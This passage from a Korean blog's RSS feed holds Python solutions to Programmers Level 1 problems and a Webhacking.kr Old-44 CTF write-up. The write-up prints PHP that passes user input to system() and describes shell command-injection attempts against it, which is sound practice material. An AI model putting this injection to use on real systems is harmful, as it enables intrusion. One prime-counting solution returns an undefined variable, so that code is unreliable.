class="number">0.5</span>:</span><br><span class="line">            result -= num</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += num</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>약수가 홀수인 경우는 약수의 제곱이 해당 수일 경우이다.<br><br>그럼 루트를 하면, 약수가 홀수인 경우는 제곱근으로 풀리기 때문에 정수의 값이 나올 것을 이용한 풀이이다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/06/09/Programmers-Level-1-%EC%95%BD%EC%88%98%EC%9D%98-%EA%B0%9C%EC%88%98%EC%99%80-%EB%8D%A7%EC%85%88/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 로또의 최고 순위와 최저 순위</title>
      <link>https://lrtk-coder.github.io/2021/06/09/Programmers-Level-1-%EB%A1%9C%EB%98%90%EC%9D%98-%EC%B5%9C%EA%B3%A0-%EC%88%9C%EC%9C%84%EC%99%80-%EC%B5%9C%EC%A0%80-%EC%88%9C%EC%9C%84/</link>
      <guid>https://lrtk-coder.github.io/2021/06/09/Programmers-Level-1-%EB%A1%9C%EB%98%90%EC%9D%98-%EC%B5%9C%EA%B3%A0-%EC%88%9C%EC%9C%84%EC%99%80-%EC%B5%9C%EC%A0%80-%EC%88%9C%EC%9C%84/</guid>
      <pubDate>Wed, 09 Jun 2021 16:11:48 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;로또의-최고-순위와-최저-순위&quot;&gt;&lt;a href=&quot;#로또의-최고-순위와-최저-순위&quot; class=&quot;headerlink&quot; title=&quot;로또의 최고 순위와 최저 순위&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/lea</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="로또의-최고-순위와-최저-순위"><a href="#로또의-최고-순위와-최저-순위" class="headerlink" title="로또의 최고 순위와 최저 순위"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/77484">로또의 최고 순위와 최저 순위</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>로또 6/45(이하 ‘로또’로 표기)는 1부터 45까지의 숫자 중 6개를 찍어서 맞히는 대표적인 복권입니다. 아래는 로또의 순위를 정하는 방식입니다.</p><table><thead><tr><th>순위</th><th>당첨 내용</th></tr></thead><tbody><tr><td>1</td><td>6개 번호가 모두 일치</td></tr><tr><td>2</td><td>5개 번호가 일치</td></tr><tr><td>3</td><td>4개 번호가 일치</td></tr><tr><td>4</td><td>3개 번호가 일치</td></tr><tr><td>5</td><td>2개 번호가 일치</td></tr><tr><td>6(낙첨)</td><td>그 외</td></tr></tbody></table><p>로또를 구매한 민우는 당첨 번호 발표일을 학수고대하고 있었습니다. 하지만, 민우의 동생이 로또에 낙서를 하여, 일부 번호를 알아볼 수 없게 되었습니다. 당첨 번호 발표 후, 민우는 자신이 구매했던 로또로 당첨이 가능했던 최고 순위와 최저 순위를 알아보고 싶어 졌습니다.<br><br>알아볼 수 없는 번호를 0으로 표기하기로 하고, 민우가 구매한 로또 번호 6개가 44, 1, 0, 0, 31 25라고 가정해보겠습니다. 당첨 번호 6개가 31, 10, 45, 1, 6, 19라면, 당첨 가능한 최고 순위와 최저 순위의 한 예는 아래와 같습니다.</p><table><thead><tr><th>당첨 번호</th><th>31</th><th>10</th><th>45</th><th>1</th><th>6</th><th>19</th><th>결과</th></tr></thead><tbody><tr><td>최고 순위 번호</td><td>31</td><td>0→10</td><td>44</td><td>1</td><td>0→6</td><td>25</td><td>4개 번호 일치, 3등</td></tr><tr><td>최저 순위 번호</td><td>31</td><td>0→11</td><td>44</td><td>1</td><td>0→7</td><td>25</td><td>2개 번호 일치, 5등</td></tr></tbody></table><ul><li>순서와 상관없이, 구매한 로또에 당첨 번호와 일치하는 번호가 있으면 맞힌 걸로 인정됩니다.</li><li>알아볼 수 없는 두 개의 번호를 각각 10, 6이라고 가정하면 3등에 당첨될 수 있습니다.<ul><li>3등을 만드는 다른 방법들도 존재합니다. 하지만, 2등 이상으로 만드는 것은 불가능합니다.</li></ul></li><li>알아볼 수 없는 두 개의 번호를 각각 11, 7이라고 가정하면 5등에 당첨될 수 있습니다.<ul><li>5등을 만드는 다른 방법들도 존재합니다. 하지만, 6등(낙첨)으로 만드는 것은 불가능합니다.</li></ul></li></ul><p>민우가 구매한 로또 번호를 담은 배열 lottos, 당첨 번호를 담은 배열 win_nums가 매개변수로 주어집니다. 이때, 당첨 가능한 최고 순위와 최저 순위를 차례대로 배열에 담아서 return 하도록 solution 함수를 완성해주세요.</p><h3 id="제한사항"><a href="#제한사항" class="headerlink" title="제한사항"></a>제한사항</h3><ul><li>lottos는 길이 6인 정수 배열입니다.</li><li>lottos의 모든 원소는 0 이상 45 이하인 정수입니다.</li><li>0은 알아볼 수 없는 숫자를 의미합니다.</li><li>0을 제외한 다른 숫자들은 lottos에 2개 이상 담겨있지 않습니다.</li><li>lottos의 원소들은 정렬되어 있지 않을 수도 있습니다.</li><li>win_nums은 길이 6인 정수 배열입니다.</li><li>win_nums의 모든 원소는 1 이상 45 이하인 정수입니다.</li><li>win_nums에는 같은 숫자가 2개 이상 담겨있지 않습니다.</li><li>win_nums의 원소들은 정렬되어 있지 않을 수도 있습니다.</li></ul><h2 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">lottos, win_nums</span>):</span></span><br><span class="line">    rank = &#123; <span class="number">6</span>: <span class="number">1</span>, <span class="number">5</span>: <span class="number">2</span>, <span class="number">4</span>: <span class="number">3</span>, <span class="number">3</span>: <span class="number">4</span>, <span class="number">2</span>: <span class="number">5</span>, <span class="number">1</span>: <span class="number">6</span>, <span class="number">0</span>: <span class="number">6</span> &#125;</span><br><span class="line">    </span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> lotto <span class="keyword">in</span> lottos:</span><br><span class="line">        <span class="keyword">if</span> lotto <span class="keyword">in</span> win_nums:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [rank[count + lottos.count(<span class="number">0</span>)], rank[count]]</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://lrtk-coder.github.io/2021/06/09/Programmers-Level-1-%EB%A1%9C%EB%98%90%EC%9D%98-%EC%B5%9C%EA%B3%A0-%EC%88%9C%EC%9C%84%EC%99%80-%EC%B5%9C%EC%A0%80-%EC%88%9C%EC%9C%84/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 음양 더하기</title>
      <link>https://lrtk-coder.github.io/2021/06/09/Programmers-Level-1-%EC%9D%8C%EC%96%91-%EB%8D%94%ED%95%98%EA%B8%B0/</link>
      <guid>https://lrtk-coder.github.io/2021/06/09/Programmers-Level-1-%EC%9D%8C%EC%96%91-%EB%8D%94%ED%95%98%EA%B8%B0/</guid>
      <pubDate>Wed, 09 Jun 2021 15:56:37 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;음양-더하기&quot;&gt;&lt;a href=&quot;#음양-더하기&quot; class=&quot;headerlink&quot; title=&quot;음양 더하기&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/lessons/76501&quot;&gt;음</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="음양-더하기"><a href="#음양-더하기" class="headerlink" title="음양 더하기"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/76501">음양 더하기</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>어떤 정수들이 있습니다. 이 정수들의 절댓값을 차례대로 담은 정수 배열 absolutes와 이 정수들의 부호를 차례대로 담은 불리언 배열 signs가 매개변수로 주어집니다. 실제 정수들의 합을 구하여 return 하도록 solution 함수를 완성해주세요.</p><h3 id="제한사항"><a href="#제한사항" class="headerlink" title="제한사항"></a>제한사항</h3><ul><li>absolutes의 길이는 1 이상 1,000 이하입니다.</li><li>absolutes의 모든 수는 각각 1 이상 1,000 이하입니다.</li><li>signs의 길이는 absolutes의 길이와 같습니다.</li><li>signs[i] 가 참이면 absolutes[i] 의 실제 정수가 양수임을, 그렇지 않으면 음수임을 의미합니다.</li></ul><h2 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">absolutes, signs</span>):</span></span><br><span class="line">    result = [num <span class="keyword">if</span> sign <span class="keyword">else</span> -num <span class="keyword">for</span> num, sign <span class="keyword">in</span> <span class="built_in">zip</span>(absolutes, signs)]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(result)</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://lrtk-coder.github.io/2021/06/09/Programmers-Level-1-%EC%9D%8C%EC%96%91-%EB%8D%94%ED%95%98%EA%B8%B0/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 폰켓몬</title>
      <link>https://lrtk-coder.github.io/2021/06/09/Programmers-Level-1-%ED%8F%B0%EC%BC%93%EB%AA%AC/</link>
      <guid>https://lrtk-coder.github.io/2021/06/09/Programmers-Level-1-%ED%8F%B0%EC%BC%93%EB%AA%AC/</guid>
      <pubDate>Wed, 09 Jun 2021 15:46:16 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;폰켓몬&quot;&gt;&lt;a href=&quot;#폰켓몬&quot; class=&quot;headerlink&quot; title=&quot;폰켓몬&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/lessons/1845&quot;&gt;폰켓몬&lt;/a&gt;&lt;/h1</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="폰켓몬"><a href="#폰켓몬" class="headerlink" title="폰켓몬"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/1845">폰켓몬</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>당신은 폰켓몬을 잡기 위한 오랜 여행 끝에, 홍 박사님의 연구실에 도착했습니다. 홍 박사님은 당신에게 자신의 연구실에 있는 총 N 마리의 폰켓몬 중에서 N/2마리를 가져가도 좋다고 했습니다.<br><br>홍 박사님 연구실의 폰켓몬은 종류에 따라 번호를 붙여 구분합니다. 따라서 같은 종류의 폰켓몬은 같은 번호를 가지고 있습니다. 예를 들어 연구실에 총 4마리의 폰켓몬이 있고, 각 폰켓몬의 종류 번호가 [3번, 1번, 2번, 3번]이라면 이는 3번 폰켓몬 두 마리, 1번 폰켓몬 한 마리, 2번 폰켓몬 한 마리가 있음을 나타냅니다. 이때, 4마리의 폰켓몬 중 2마리를 고르는 방법은 다음과 같이 6가지가 있습니다.</p><ul><li>첫 번째(3번), 두 번째(1번) 폰켓몬을 선택</li><li>첫 번째(3번), 세 번째(2번) 폰켓몬을 선택</li><li>첫 번째(3번), 네 번째(3번) 폰켓몬을 선택</li><li>두 번째(1번), 세 번째(2번) 폰켓몬을 선택</li><li>두 번째(1번), 네 번째(3번) 폰켓몬을 선택</li><li>세 번째(2번), 네 번째(3번) 폰켓몬을 선택</li></ul><p>이때, 첫 번째(3번) 폰켓몬과 네 번째(3번) 폰켓몬을 선택하는 방법은 한 종류(3번 폰켓몬 두 마리)의 폰켓몬만 가질 수 있지만, 다른 방법들은 모두 두 종류의 폰켓몬을 가질 수 있습니다. 따라서 위 예시에서 가질 수 있는 폰켓몬 종류 수의 최댓값은 2가 됩니다.<br><br>당신은 최대한 다양한 종류의 폰켓몬을 가지길 원하기 때문에, 최대한 많은 종류의 폰켓몬을 포함해서 N/2마리를 선택하려 합니다. N마리 폰켓몬의 종류 번호가 담긴 배열 nums가 매개변수로 주어질 때, N/2마리의 폰켓몬을 선택하는 방법 중, 가장 많은 종류의 폰켓몬을 선택하는 방법을 찾아, 그때의 폰켓몬 종류 번호의 개수를 return 하도록 solution 함수를 완성해주세요.</p><h3 id="제한사항"><a href="#제한사항" class="headerlink" title="제한사항"></a>제한사항</h3><ul><li>nums는 폰켓몬의 종류 번호가 담긴 1차원 배열입니다.</li><li>nums의 길이(N)는 1 이상 10,000 이하의 자연수이며, 항상 짝수로 주어집니다.</li><li>폰켓몬의 종류 번호는 1 이상 200,000 이하의 자연수로 나타냅니다.</li><li>가장 많은 종류의 폰켓몬을 선택하는 방법이 여러 가지인 경우에도, 선택할 수 있는 폰켓몬 종류 개수의 최댓값 하나만 return 하면 됩니다.</li></ul><h2 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">nums</span>):</span></span><br><span class="line">    n = <span class="built_in">len</span>(nums)//<span class="number">2</span></span><br><span class="line">    nums = <span class="built_in">set</span>(nums)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(nums) &gt;= n:</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(nums)</span><br></pre></td></tr></table></figure><p>문제 설명이 길지만 결론은 사용 가능한 포켓몬 수를 출력하는 문제이다.<br><br>나는 set 함수를 이용하여 중복을 제거하여 사용할 수 있는 포켓몬을 구하여 문제 풀이를 하였다.</p>]]></content:encoded>
      
      
      
      
      <comments>https://lrtk-coder.github.io/2021/06/09/Programmers-Level-1-%ED%8F%B0%EC%BC%93%EB%AA%AC/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 3진법 뒤집기</title>
      <link>https://lrtk-coder.github.io/2021/06/09/Programmers-Level-1-3%EC%A7%84%EB%B2%95-%EB%92%A4%EC%A7%91%EA%B8%B0/</link>
      <guid>https://lrtk-coder.github.io/2021/06/09/Programmers-Level-1-3%EC%A7%84%EB%B2%95-%EB%92%A4%EC%A7%91%EA%B8%B0/</guid>
      <pubDate>Wed, 09 Jun 2021 15:35:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;3진법-뒤집기&quot;&gt;&lt;a href=&quot;#3진법-뒤집기&quot; class=&quot;headerlink&quot; title=&quot;3진법 뒤집기&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/lessons/68935</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="3진법-뒤집기"><a href="#3진법-뒤집기" class="headerlink" title="3진법 뒤집기"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/68935">3진법 뒤집기</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>자연수 n이 매개변수로 주어집니다. n을 3진법 상에서 앞뒤로 뒤집은 후, 이를 다시 10진법으로 표현한 수를 return 하도록 solution 함수를 완성해주세요.</p><h3 id="제한사항"><a href="#제한사항" class="headerlink" title="제한사항"></a>제한사항</h3><ul><li>n은 1 이상 100,000,000 이하인 자연수입니다.</li></ul><h2 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">converse</span>(<span class="params">n:<span class="built_in">int</span>, q:<span class="built_in">int</span></span>):</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        n, mod = <span class="built_in">divmod</span>(n, q)</span><br><span class="line">        result += <span class="built_in">str</span>(mod)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">str</span>(converse(n, <span class="number">3</span>)), <span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>10진수에서 3진수로 변환시켜주는 함수가 없어서 divmod 함수를 이용한 n진수 변환 함수를 제작하였다.<br><br>변환된 3진수의 값은 int 함수를 이용하여 3진수에서 10진수로 변환하였다.</p>]]></content:encoded>
      
      
      
      
      <comments>https://lrtk-coder.github.io/2021/06/09/Programmers-Level-1-3%EC%A7%84%EB%B2%95-%EB%92%A4%EC%A7%91%EA%B8%B0/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Webhacking.kr Old - 44 Write Up</title>
      <link>https://lrtk-coder.github.io/2021/06/09/Webhacking-kr-Old-44-Write-Up/</link>
      <guid>https://lrtk-coder.github.io/2021/06/09/Webhacking-kr-Old-44-Write-Up/</guid>
      <pubDate>Wed, 09 Jun 2021 05:47:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Webhacking-kr-Write-Up&quot;&gt;&lt;a href=&quot;#Webhacking-kr-Write-Up&quot; class=&quot;headerlink&quot; title=&quot;Webhacking.kr Write Up&quot;&gt;&lt;/a&gt;Webhacking.kr Write </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Webhacking-kr-Write-Up"><a href="#Webhacking-kr-Write-Up" class="headerlink" title="Webhacking.kr Write Up"></a>Webhacking.kr Write Up</h1><h2 id="Old-44"><a href="#Old-44" class="headerlink" title="Old - 44"></a>Old - 44</h2><p><img src="/images/pasted-665.png"><br>무슨 기능을 하는 페이지인지 모르겠어서 일단 이름을 넣어서 서버에 보내봤다.</p><p><img src="/images/pasted-666.png"><br>입력한 이름을 ‘hello!’에 이름을 붙어서 출력하는 기능인 페이지로 확인됐다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span>($_POST[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line">    $id = $_POST[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    $id = substr($id,<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;hello! <span class="subst">&#123;$id&#125;</span>&#x27;&quot;</span>); <span class="comment">// You just need to execute ls</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>코드가 주어져서 확인해보니, 입력한 값을 System 함수로 실행된 <code>echo &#39;hello! &#123;id&#125;&#39;</code>의 결과를 페이지에 출력하고 있는 것으로 확인되었다.<br><br>하지만 제한된 글자는 5글자로 제한되어 있어서, 해당 조건에 맞춰서 명령어 인젝션을 해줘야 한다. 또한 주석으로 ls를  실행시켜서 결과값을 출력시켜야한다.</p><p><img src="/images/pasted-667.png"><br>나는 비박스에서 사용했었던 세미클론(;)을 이용하여, 동시에 두개의 명령어를 실행시켜서 출력하려는 시도하였지만 <code>echo &#39;hello! &#39;;ls&#39;</code>가 되어서 ls 명령어가 작동하지 않았다.</p><p><img src="/images/pasted-668.png"><br>혹시 <code>ls&#39;&#39;</code>가 작동되는지 확실하지 않아서 한번 시도를 해보니, 작동이 되었다.</p><p><img src="/images/pasted-669.png"><br>System 함수 안에서도 작동이 잘 되어 문제 페이지에 시도를 해봤다.</p><p><img src="/images/pasted-670.png"><br>Flag 파일이 있는 것을 볼 수 있었다. 하지만 해당 파일의 이름이 flag값으로 보이지 않았다.</p><p><img src="/images/pasted-671.png"><br>혹시나 하여 파일을 요청하니, 다행히 파일을 열람할 수 있었다.</p><p><img src="/images/pasted-672.png"><br>flag 값이 기존에 봤던 값들과 다르고, 인터넷 주소 같아서 한번 들어가보니 일본 노래 유튜브가 나왔다….</p><p><img src="/images/pasted-673.png"><br>댓글과 동영상을 올린 채널에 들어가봤지만, flag와 관련된 것을 발견할 수 없어서 일단 flag을 제출하니, 포인트를 획득할 수 있었다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/Webhacking-kr/">Webhacking.kr</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Webhacking-kr/">Webhacking.kr</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/06/09/Webhacking-kr-Old-44-Write-Up/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 소수 만들기</title>
      <link>https://lrtk-coder.github.io/2021/06/09/Programmers-Level-1-%EC%86%8C%EC%88%98-%EB%A7%8C%EB%93%A4%EA%B8%B0/</link>
      <guid>https://lrtk-coder.github.io/2021/06/09/Programmers-Level-1-%EC%86%8C%EC%88%98-%EB%A7%8C%EB%93%A4%EA%B8%B0/</guid>
      <pubDate>Wed, 09 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;소수-만들기&quot;&gt;&lt;a href=&quot;#소수-만들기&quot; class=&quot;headerlink&quot; title=&quot;소수 만들기&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/lessons/12977&quot;&gt;소</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="소수-만들기"><a href="#소수-만들기" class="headerlink" title="소수 만들기"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/12977">소수 만들기</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>주어진 숫자 중 3개의 수를 더했을 때 소수가 되는 경우의 개수를 구하려고 합니다. 숫자들이 들어있는 배열 nums가 매개변수로 주어질 때, nums에 있는 숫자들 중 서로 다른 3개를 골라 더했을 때 소수가 되는 경우의 개수를 return 하도록 solution 함수를 완성해주세요.</p><h3 id="제한사항"><a href="#제한사항" class="headerlink" title="제한사항"></a>제한사항</h3><ul><li>nums에 들어있는 숫자의 개수는 3개 이상 50개 이하입니다.</li><li>nums의 각 원소는 1 이상 1,000 이하의 자연수이며, 중복된 숫자가 들어있지 않습니다.</li></ul><h2 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> combinations</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">total</span>):</span> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, total): </span><br><span class="line">        <span class="keyword">if</span> total % i == <span class="number">0</span> :</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">nums</span>):</span></span><br><span class="line">    nums = <span class="built_in">list</span>(combinations(nums, <span class="number">3</span>))</span><br><span class="line">    </span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> nums: </span><br><span class="line">        <span class="keyword">if</span> check(<span class="built_in">sum</span>(i)):</span><br><span class="line">            answer += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> answer</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/">프로그래머스</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/Level-1/">Level 1</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers/">Programmers</category>
      
      <category domain="https://lrtk-coder.github.io/tags/Programmers-Level-1/">Programmers Level 1</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EA%B5%AC%ED%98%84/">구현</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/06/09/Programmers-Level-1-%EC%86%8C%EC%88%98-%EB%A7%8C%EB%93%A4%EA%B8%B0/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Programmers Level 1 - 신규 아이디 추천</title>
      <link>https://lrtk-coder.github.io/2021/06/07/Programmers-Level-1-%EC%8B%A0%EA%B7%9C-%EC%95%84%EC%9D%B4%EB%94%94-%EC%B6%94%EC%B2%9C/</link>
      <guid>https://lrtk-coder.github.io/2021/06/07/Programmers-Level-1-%EC%8B%A0%EA%B7%9C-%EC%95%84%EC%9D%B4%EB%94%94-%EC%B6%94%EC%B2%9C/</guid>
      <pubDate>Mon, 07 Jun 2021 23:11:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;신규-아이디-추천&quot;&gt;&lt;a href=&quot;#신규-아이디-추천&quot; class=&quot;headerlink&quot; title=&quot;신규 아이디 추천&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://programmers.co.kr/learn/courses/30/lessons</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="신규-아이디-추천"><a href="#신규-아이디-추천" class="headerlink" title="신규 아이디 추천"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/72410">신규 아이디 추천</a></h1><h2 id="문제"><a href="#문제" class="headerlink" title="문제"></a>문제</h2><p>신규 유저가 입력한 아이디를 나타내는 new_id가 매개변수로 주어질 때, “네오”가 설계한 7단계의 처리 과정을 거친 후의 추천 아이디를 return 하도록 solution 함수를 완성해 주세요.</p><h3 id="제한사항"><a href="#제한사항" class="headerlink" title="제한사항"></a>제한사항</h3><p>new_id는 길이 1 이상 1,000 이하인 문자열입니다.<br>new_id는 알파벳 대문자, 알파벳 소문자, 숫자, 특수문자로 구성되어 있습니다.<br>new_id에 나타날 수 있는 특수문자는 -_.~!@#$%^&amp;*()=+[{]}:?,&lt;&gt;/ 로 한정됩니다.</p><h2 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h2><h3 id="방법1"><a href="#방법1" class="headerlink" title="방법1"></a>방법1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 